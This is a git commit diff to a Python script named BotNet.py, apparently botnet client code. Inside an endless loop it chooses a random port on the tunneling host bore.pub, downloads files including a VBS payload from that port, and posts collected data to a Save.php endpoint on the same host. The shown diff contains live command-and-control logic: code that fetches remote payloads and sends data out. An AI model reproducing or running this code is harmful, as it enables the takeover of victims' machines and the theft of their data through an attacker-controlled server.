189cfdc8ea894cc4e63146db84e2a866f3b11faf
AbdulazizDXT <143551117+AzizDXT@users.noreply.github.com>
2023-09-17 15:56:07 +0400

    Add files via upload

--- BotNet.py
+++ BotNet.py
@@ -9,23 +9,28 @@ import subprocess
 import uuid
 import wmi
 import concurrent.futures  # Import the 'concurrent.futures' module
-
-# Function to clear the terminal screen based on the operating system
-def clear_screen():
-    if os.name == 'nt':  # Windows
-        os.system('cls')
-    else:  # Non-Windows (e.g., Linux, macOS)
-        os.system('clear')
-        os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Network | lolcat")
-
-def send_data_to_url(url, data):
-    try:
-        response = requests.post(url, data=data)
-        return f"Data sent to {url}: {response.text}"
-    except Exception as e:
-        return f"Error sending data to {url}: {str(e)}"
+import random
 
 while True:
+    numbers = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
+    random_number = random.choice(numbers)
+    port = random_number
+
+    # Function to clear the terminal screen based on the operating system
+    def clear_screen():
+        if os.name == 'nt':  # Windows
+            os.system('cls')
+        else:  # Non-Windows (e.g., Linux, macOS)
+            os.system('clear')
+            os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Network | lolcat")
+
+    def send_data_to_url(url, data):
+        try:
+            response = requests.post(url, data=data)
+            return f"Data sent to {url}: {response.text}"
+        except Exception as e:
+            return f"Error sending data to {url}: {str(e)}"
+
     try:
         # Step 1: Check if files exist and delete them
         home_directory = os.path.expanduser("~")
@@ -38,8 +43,8 @@ while True:
             os.remove(vbs_file_path)
 
         # Step 2: Download the necessary files
-        url1 = "http://bore.pub:61723/Script.io"
-        url2 = "http://bore.pub:61723/VBSEX.io"
+        url1 = f"http://bore.pub:{port}/Script.io"
+        url2 = f"http://bore.pub:{port}/VBSEX.io"
 
         response1 = requests.get(url1)
         if response1.status_code == 200:
@@ -96,16 +101,7 @@ while True:
 
         # List of PHP endpoint URLs
         php_urls = [
-            "http://bore.pub:61723/Save.php",
-            "http://bore.pub:3348/Save.php",
-            "http://bore.pub:44693/Save.php",
-            "http://bore.pub:44688/Save.php",
-            "http://bore.pub:12554/Save.php",
-            "http://bore.pub:12539/Save.php",
-            "http://bore.pub:61956/Save.php",
-            "http://bore.pub:12345/Save.php",
-            "http://bore.pub:10010/Save.php",
-            "http://bore.pub:10012/Save.php"
+            f"http://bore.pub:{port}/Save.php"
         ]
 
         # Use concurrent.futures to send data to all URLs concurrently
